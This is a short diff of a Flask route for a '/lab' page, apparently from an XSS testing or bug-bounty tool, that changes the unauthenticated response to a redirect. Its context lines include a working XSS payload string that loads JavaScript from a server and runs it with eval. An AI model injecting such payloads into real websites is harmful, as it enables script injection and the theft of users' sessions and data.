@@ -1,4 +1,4 @@
-from flask import Blueprint, render_template, request
+from flask import Blueprint, render_template, request, redirect, url_for
 from utils import *
 from json import dumps as jsonify
 import pprint
@@ -28,7 +28,7 @@ only diff between lab and index is the include(bounties or lab)
 @lab.route('/lab')
 def index():
 	if not user_auth():
-		return render_template('ajax.html', info=jsonify({'error':'n', 'msg':'You are not authenticated'}))
+		return redirect(url_for('index'))
 	#gen payload
 	payloads = []
 	payloads.append('<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//127.0.0.1:5000/js2");a.send();</script>')
